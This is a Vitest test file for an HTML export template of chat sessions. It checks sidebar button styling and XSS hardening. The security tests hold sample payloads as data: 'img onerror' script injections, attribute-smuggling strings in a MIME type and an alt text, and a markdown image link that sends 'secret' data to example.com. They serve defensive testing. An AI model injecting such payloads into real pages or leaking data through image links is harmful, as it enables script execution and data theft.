import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import vm from "node:vm";
import { describe, expect, it } from "vitest";

type SessionEntry = {
  id: string;
  parentId: string | null;
  timestamp: string;
  type: string;
  message?: unknown;
  summary?: string;
  content?: unknown;
  display?: boolean;
  customType?: string;
  provider?: string;
  modelId?: string;
  thinkingLevel?: string;
};

type SessionData = {
  header: { id: string; timestamp: string };
  entries: SessionEntry[];
  leafId: string;
  systemPrompt: string;
  tools: unknown[];
};

type ParsedHtml = {
  document: Document;
  window: {
    HTMLElement?: unknown;
  };
};

type LinkedomModule = {
  parseHTML(html: string): ParsedHtml;
};

const LINKEDOM_MODULE = "linkedom";

const exportHtmlDir = path.dirname(fileURLToPath(import.meta.url));
const templateHtml = fs.readFileSync(path.join(exportHtmlDir, "template.html"), "utf8");
const templateCss = fs.readFileSync(path.join(exportHtmlDir, "template.css"), "utf8");
const templateJs = fs.readFileSync(path.join(exportHtmlDir, "template.js"), "utf8");
const markedJs = fs.readFileSync(path.join(exportHtmlDir, "vendor", "marked.min.js"), "utf8");
const highlightJs = fs.readFileSync(path.join(exportHtmlDir, "vendor", "highlight.min.js"), "utf8");

let parseHtmlPromise: Promise<LinkedomModule["parseHTML"]> | null = null;

async function loadParseHTML(): Promise<LinkedomModule["parseHTML"]> {
  parseHtmlPromise ??= (import(LINKEDOM_MODULE) as Promise<LinkedomModule>).then(
    ({ parseHTML }) => parseHTML,
  );
  return parseHtmlPromise;
}

function installScrollIntoViewStub(document: Document) {
  const patchElement = <T extends Element | null>(element: T): T => {
    if (element && !("scrollIntoView" in element)) {
      Object.defineProperty(element, "scrollIntoView", {
        configurable: true,
        value: () => {},
      });
    }
    return element;
  };

  for (const element of document.querySelectorAll("*")) {
    patchElement(element);
  }

  const getElementById = document.getElementById.bind(document);
  document.getElementById = ((id: string) =>
    patchElement(getElementById(id))) as typeof document.getElementById;

  const querySelector = document.querySelector.bind(document);
  document.querySelector = ((selectors: string) =>
    patchElement(querySelector(selectors))) as typeof document.querySelector;

  const createElement = document.createElement.bind(document);
  document.createElement = ((tagName: string, options?: ElementCreationOptions) =>
    patchElement(createElement(tagName, options))) as typeof document.createElement;
}

async function renderTemplate(sessionData: SessionData) {
  const html = [
    ["CSS", ""],
    ["SESSION_DATA", Buffer.from(JSON.stringify(sessionData), "utf8").toString("base64")],
    ["MARKED_JS", ""],
    ["HIGHLIGHT_JS", ""],
    ["JS", ""],
  ].reduce(
    (currentHtml, [name, value]) =>
      currentHtml.replace(
        new RegExp(
          `(<(?:script|style)\\b(?=[^>]*\\bdata-openclaw-export-placeholder="${name}")[^>]*>)(</(?:script|style)>)`,
        ),
        (_match: string, openTag: string, closeTag: string) =>
          `${openTag.replace(/\sdata-openclaw-export-placeholder="[^"]*"/, "")}${value}${closeTag}`,
      ),
    templateHtml,
  );

  const parseHTML = await loadParseHTML();
  const { document, window } = parseHTML(html);
  if (window.HTMLElement) {
    installScrollIntoViewStub(document);
  }

  const immediateTimeout = (fn: (...args: unknown[]) => void) => {
    fn();
    return 0;
  };
  const runtime: Record<string, unknown> = {
    document,
    console,
    clearTimeout: () => {},
    setTimeout: immediateTimeout,
    URLSearchParams,
    TextDecoder,
    atob: (s: string) => Buffer.from(s, "base64").toString("binary"),
    btoa: (s: string) => Buffer.from(s, "binary").toString("base64"),
    navigator: { clipboard: { writeText: async () => {} } },
    history: { replaceState: () => {} },
    location: { href: "http://localhost/export.html", search: "" },
  };
  runtime.window = runtime;
  runtime.self = runtime;
  runtime.globalThis = runtime;

  vm.createContext(runtime);
  vm.runInContext(markedJs, runtime);
  vm.runInContext(highlightJs, runtime);
  vm.runInContext(templateJs, runtime);
  return { document };
}

function now() {
  return new Date("2026-02-24T00:00:00.000Z").toISOString();
}

function selectorSpecificity(selector: string): [number, number, number] {
  const ids = selector.match(/#[\w-]+/g)?.length ?? 0;
  const classes = selector.match(/\.[\w-]+/g)?.length ?? 0;
  const withoutIdsOrClasses = selector.replace(/#[\w-]+|\.[\w-]+/g, " ");
  const elements = withoutIdsOrClasses
    .split(/[\s>+~]+/)
    .filter((part) => /^[a-z][\w-]*$/i.test(part)).length;
  return [ids, classes, elements];
}

function compareSpecificity(left: [number, number, number], right: [number, number, number]) {
  for (let index = 0; index < left.length; index += 1) {
    if (left[index] !== right[index]) {
      return left[index] - right[index];
    }
  }
  return 0;
}

function firstSelectorForDisplay(css: string, display: string, startAt: number): string | null {
  const displayRule = new RegExp(`([^{}]+)\\{[^{}]*\\bdisplay\\s*:\\s*${display}\\s*;`, "g");
  displayRule.lastIndex = startAt;
  const match = displayRule.exec(css);
  return match?.[1]?.split(",").at(-1)?.trim() ?? null;
}

describe("export html sidebar trigger affordance", () => {
  it("keeps the hamburger sidebar trigger accessible and visibly interactive", () => {
    expect(templateHtml).toContain('id="hamburger" class="sidebar-menu-trigger"');
    expect(templateHtml).toContain('aria-label="Open sidebar"');
    expect(templateHtml).toContain('<line x1="4" x2="20" y1="6" y2="6" />');
    expect(templateHtml).toContain('<line x1="4" x2="20" y1="12" y2="12" />');
    expect(templateHtml).toContain('<line x1="4" x2="20" y1="18" y2="18" />');
    expect(templateCss).toContain("#hamburger.sidebar-menu-trigger {");
    expect(templateCss).toContain("cursor: pointer;");
    expect(templateCss).toContain("#hamburger.sidebar-menu-trigger:hover {");
    expect(templateCss).toContain("background: var(--container-bg);");
    expect(templateCss).toContain("#hamburger.sidebar-menu-trigger:focus-visible {");
  });

  it("lets the mobile hamburger display rule win the CSS cascade", () => {
    const baseSelector = "#hamburger.sidebar-menu-trigger";
    const mobileMediaIndex = templateCss.indexOf("@media (max-width: 900px)");
    const mobileSelector = firstSelectorForDisplay(templateCss, "inline-flex", mobileMediaIndex);

    expect(mobileMediaIndex).toBeGreaterThan(templateCss.indexOf(`${baseSelector} {`));
    expect(mobileSelector).toBe(baseSelector);
    if (!mobileSelector) {
      throw new Error("Missing mobile hamburger display rule");
    }
    expect(
      compareSpecificity(selectorSpecificity(mobileSelector), selectorSpecificity(baseSelector)),
    ).toBeGreaterThanOrEqual(0);
  });
});

describe("export html security hardening", () => {
  it("escapes raw HTML from markdown blocks", async () => {
    const attack = "<img src=x onerror=alert(1)>";
    const session: SessionData = {
      header: { id: "session-1", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: { role: "user", content: attack },
        },
        {
          id: "2",
          parentId: "1",
          timestamp: now(),
          type: "branch_summary",
          summary: attack,
        },
        {
          id: "3",
          parentId: "2",
          timestamp: now(),
          type: "custom_message",
          customType: "x",
          display: true,
          content: attack,
        },
      ],
      leafId: "3",
      systemPrompt: "",
      tools: [],
    };

    const { document } = await renderTemplate(session);
    const messages = document.getElementById("messages");
    expect(messages).toBeTruthy();
    expect(messages?.querySelector("img[onerror]")).toBeNull();
    expect(messages?.innerHTML).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("escapes tree and header metadata fields", async () => {
    const attack = "<img src=x onerror=alert(9)>";
    const baseEntries: SessionEntry[] = [
      {
        id: "1",
        parentId: null,
        timestamp: now(),
        type: "message",
        message: { role: "user", content: "ok" },
      },
      {
        id: "2",
        parentId: "1",
        timestamp: now(),
        type: "message",
        message: {
          role: "assistant",
          model: attack,
          provider: "p",
          content: [{ type: "text", text: "assistant" }],
        },
      },
      {
        id: "3",
        parentId: "2",
        timestamp: now(),
        type: "message",
        message: { role: "toolResult", toolName: attack },
      },
      {
        id: "4",
        parentId: "3",
        timestamp: now(),
        type: "model_change",
        provider: "p",
        modelId: attack,
      },
      {
        id: "5",
        parentId: "4",
        timestamp: now(),
        type: "thinking_level_change",
        thinkingLevel: attack,
      },
      {
        id: "6",
        parentId: "5",
        timestamp: now(),
        type: attack,
      },
    ];

    const headerSession: SessionData = {
      header: { id: "session-2", timestamp: now() },
      entries: baseEntries,
      leafId: "6",
      systemPrompt: "",
      tools: [],
    };

    const { document } = await renderTemplate(headerSession);
    const tree = document.getElementById("tree-container");
    const header = document.getElementById("header-container");
    expect(tree).toBeTruthy();
    expect(header).toBeTruthy();
    expect(tree?.querySelector("img[onerror]")).toBeNull();
    expect(header?.querySelector("img[onerror]")).toBeNull();
    expect(tree?.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");
    expect(header?.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");

    const modelLeafSession: SessionData = {
      header: { id: "session-2-model", timestamp: now() },
      entries: baseEntries,
      leafId: "4",
      systemPrompt: "",
      tools: [],
    };
    const modelLeaf = (await renderTemplate(modelLeafSession)).document;
    expect(modelLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(modelLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );

    const thinkingLeafSession: SessionData = {
      header: { id: "session-2-thinking", timestamp: now() },
      entries: baseEntries,
      leafId: "5",
      systemPrompt: "",
      tools: [],
    };
    const thinkingLeaf = (await renderTemplate(thinkingLeafSession)).document;
    expect(thinkingLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(thinkingLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );
  });

  it("sanitizes image MIME types used in data URLs", async () => {
    const session: SessionData = {
      header: { id: "session-3", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: {
            role: "user",
            content: [
              {
                type: "image",
                data: "AAAA",
                mimeType: 'image/png" onerror="alert(7)',
              },
            ],
          },
        },
      ],
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = await renderTemplate(session);
    const img = document.querySelector("#messages .message-image");
    expect(img).toBeTruthy();
    expect(img?.getAttribute("onerror")).toBeNull();
    expect(img?.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
  });

  it("flattens remote markdown images but keeps data-image markdown", async () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session: SessionData = {
      header: { id: "session-4", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: {
            role: "assistant",
            content: [
              {
                type: "text",
                text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
              },
            ],
          },
        },
      ],
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = await renderTemplate(session);
    const messages = document.getElementById("messages");
    expect(messages).toBeTruthy();
    expect(messages?.querySelector('img[src^="https://"]')).toBeNull();
    expect(messages?.textContent).toContain("exfil");
    expect(messages?.querySelector(`img[src="${dataImage}"]`)).toBeTruthy();
  });

  it("escapes markdown data-image attributes", async () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session: SessionData = {
      header: { id: "session-5", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: {
            role: "assistant",
            content: [
              {
                type: "text",
                text: `![x" onerror="alert(1)](${dataImage})`,
              },
            ],
          },
        },
      ],
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = await renderTemplate(session);
    const img = document.querySelector("#messages img");
    expect(img).toBeTruthy();
    expect(img?.getAttribute("onerror")).toBeNull();
    expect(img?.getAttribute("alt")).toBe('x" onerror="alert(1)');
    expect(img?.getAttribute("src")).toBe(dataImage);
  });
});
